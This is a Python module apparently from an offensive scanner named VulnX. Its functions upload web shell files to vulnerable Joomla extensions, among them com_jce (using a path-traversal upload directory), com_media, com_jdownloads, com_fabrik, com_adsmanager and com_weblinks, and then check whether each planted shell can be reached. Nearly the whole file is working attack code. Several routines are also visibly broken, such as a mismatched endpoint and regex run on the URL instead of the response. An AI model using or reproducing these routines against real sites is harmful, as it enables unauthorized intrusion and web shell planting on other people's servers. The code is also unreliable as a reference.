import re
import random
import datetime
import requests
from common.uriParser import parsing_url as hostd
now = datetime.datetime.now()
year = now.strftime('%Y')
month= now.strftime('%m')

import os
Session = requests.Session()

from common.colors import failexploit , vulnexploit , que , info , good
from common.requestUp import sendrequest as vxpost
from common.requestUp import getrequest as vxget

def joomla_comjce(url,headers,timeout):
    host = hostd(url)
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"
    data = {
            'upload-dir':'./../../',
            'upload-overwrite':0,
            'Filedata' : [open('shell/VulnX.gif','rb')],
            'action':'Upload',
    }
    content = vxpost(endpoint,data,headers,timeout)
    path_shell = url + "/VulnX.gif"
    res=requests.get(path_shell, headers).text
    matches = re.findall(re.compile(r'/image/gif/'),res)
    if matches:
        print (' %s Com Jce               %s    %s' %(que,vulnexploit,path_shell))
    else: 
        print (' %s Com Jce               %s' %(que , failexploit))

def joomla_comedia(url,headers,timeout):
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
    headers={"content-type":["form-data"]}
    fieldname = 'Filedata[]'
    shell = open('shell/VulnX.txt','rb')
    data = {
            fieldname:shell,
    }
    content = vxpost(endpoint,data,headers,timeout)
    path_shell = endpoint+"/images/XAttacker.txt"
    response = vxget(path_shell,headers,timeout)
    if re.findall(r'Tig', response):
        print (' %s Com Media             %s    %s' %(que,vulnexploit,path_shell))
    else: 
        print (' %s Com Media             %s' %(que , failexploit))


def joomla_comjdownloads(url,headers,timeout):
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"index.php?option=com_jdownloads&Itemid=0&view=upload"
    headers={"content-type":["form-data"]}
    files = open('shell/VulnX.zip','rb')
    shell = open('shell/VulnX.gif','rb')
    data = {
        'name' : 'Tig',
        'mail' :'tig@tig.com', 
        'filetitle' :'Tig',
        'catlist':'1',
        'license':'0',
        'language':'0',
        'system':'0',
        'file_upload': files,
        'pic_upload':shell,
        'description':'<p>zot</p>',
        'senden':'Send file',
        'option':'com_jdownloads',
        'view':'upload',
        'send':'1', 
        '24c22896d6fe6977b731543b3e44c22f':'1'
    }
    content = vxpost(endpoint,data,headers,timeout)
    path_shell = endpoint+"/images/jdownloads/screenshots/VulnX.gif?Vuln=X"
    response = vxget(path_shell,headers,timeout)
    if re.findall(r'Vuln X', response):
        print (' %s Com Jdownloads        %s    %s' %(que,vulnexploit,path_shell))
    else: 
        print (' %s Com Jdownloads        %s' %(que , failexploit))

def joomla_comjdownloads2(url,headers,timeout):
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"/images/jdownloads/screenshots/VulnX.php"
    headers={"content-type":["form-data"]}
    files = open('shell/VulnX.zip','rb')
    shell = open('shell/VulnX.gif','rb')
    data = {
        'name' : 'Tig',
        'mail' :'tig@tig.com', 
        'filetitle' :'Tig',
        'catlist':'1',
        'license':'0',
        'language':'0',
        'system':'0',
        'file_upload': files,
        'pic_upload':shell,
        'description':'<p>zot</p>',
        'senden':'Send file',
        'option':'com_jdownloads',
        'view':'upload',
        'send':'1', 
        '24c22896d6fe6977b731543b3e44c22f':'1'
    }
    response = vxget(endpoint,headers,timeout)
    if re.findall(r'200', response):
        print (' %s Com Jdownloads2       %s    %s' %(que,vulnexploit,endpoint))
    else: 
        print (' %s Com Jdownloads2       %s' %(que , failexploit))

def joomla_fabrik2(url,headers,timeout):
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

    headers={"content-type":["form-data"]}
    fieldname = 'file'
    shell = open('shell/VulnX.php','rb')
    data = {
            fieldname:shell,
    }
    content = vxpost(endpoint,data,headers,timeout)
    path_shell = endpoint+"/images/XAttacker.txt"
    response = vxget(path_shell,headers,timeout)
    if re.findall(r'Vuln X', response):
        print (' %s Com Fabrik2            %s    %s' %(que,vulnexploit,path_shell))
    else: 
        print (' %s Com Fabrik2            %s' %(que , failexploit))

def joomla_fabrik2_d(url,headers,timeout):
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

    headers={"content-type":["form-data"]}
    fieldname = 'file'
    shell = open('shell/VulnX.txt','rb')
    data = {
            fieldname:shell,
    }
    content = vxpost(endpoint,data,headers,timeout)
    path_shell = endpoint+"/images/XAttacker.txt"
    response = vxget(path_shell,headers,timeout)
    if re.findall(r'Tig', response):
        print (' %s Com Fabrik2            %s    %s' %(que,vulnexploit,path_shell))
    else: 
        print (' %s Com Fabrik2            %s' %(que , failexploit))

def joomla_foxcontact(url,headers,timeout):
    headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'

#    foxf = {'components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php',
#            'index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php',
#            'index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php',
#            'components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php'}
    
    
    endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

    headers={"content-type":["form-data"]}
    fieldname = 'file'
    shell = open('shell/VulnX.txt','rb')
    data = {
            fieldname:shell,
    }
    content = vxpost(endpoint,data,headers,timeout)
    path_shell = endpoint+"/images/XAttacker.txt"
    response = vxget(path_shell,headers,timeout)
    if re.findall(r'Tig', response):
        print (' %s Fox Contact            %s    %s' %(que,vulnexploit,path_shell))
    else: 
        print (' %s fox Contact            %s' %(que , failexploit))

def comadsmanager(url,headers):
    endpoint = url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
    img = open('shell/VulnX.php', 'rb')
    name_img= os.path.basename('shell/VulnX.html')
    files= {'image': (name_img,img,'form-data',{'Expires': '0'}) }
    upload_file = Session.post(url,files=files)
    shellup = url + "/tmp/plupload/VulnX.html"
    checkShell = requests.get(shellup).text
    statusCheck = re.findall(re.compile(r'VulnX'),checkShell)
    if statusCheck:
        print(' %s comadsmanager         %s    %s' %(que,vulnexploit,shellup))
    else:
        print(' %s comadsmanager         %s' %(que , failexploit))  

def comblog(url,headers):
    endpoint = url + "/index.php?option=com_myblog&task=ajaxupload"
    checkShell = requests.get(endpoint).text
    statusCheck = re.findall(re.compile(r'has been uploaded'),endpoint)
    if statusCheck:
        print(' %s comblog               %s    %s' %(que,vulnexploit,endpoint))
    else:
        print(' %s comblog               %s' %(que , failexploit))  

def comusers(url,headers):
    endpoint = url + "/index.php?option=com_users&view=registration"
    checkShell = requests.get(endpoint).text
    statusCheck = re.findall(re.compile(r'jform_email2-lbl'),endpoint)
    if statusCheck:
        print(' %s comusers              %s    %s' %(que,vulnexploit,endpoint))
    else:
        print(' %s comusers              %s' %(que , failexploit))  

def comweblinks(url,headers):
    endpoint = url + "/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author="
    token = re.findall(re.compile(r'<form action=\"(.*?)" id="uploadForm\"'),endpoint)
    if token:
        url = token.group(1)
    img = open('shell/VulnX.php', 'rb')
    name_img= os.path.basename('shell/VulnX.gif')
    fieldname = "image[]"
    files= {'image': (name_img,img,'form-data',{'Expires': '0'})}
    data = { fieldname : files }
    upload_file = Session.post(url,data)
    shellup = url + "/images/VulnX.gif"
    checkShell = requests.get(shellup).status_code
    statusCheck = re.findall(re.compile(r'200'),checkShell)
    if statusCheck:
        print(' %s comweblinks           %s    %s' %(que,vulnexploit,shellup))
    else:
        print(' %s comweblinks           %s' %(que , failexploit))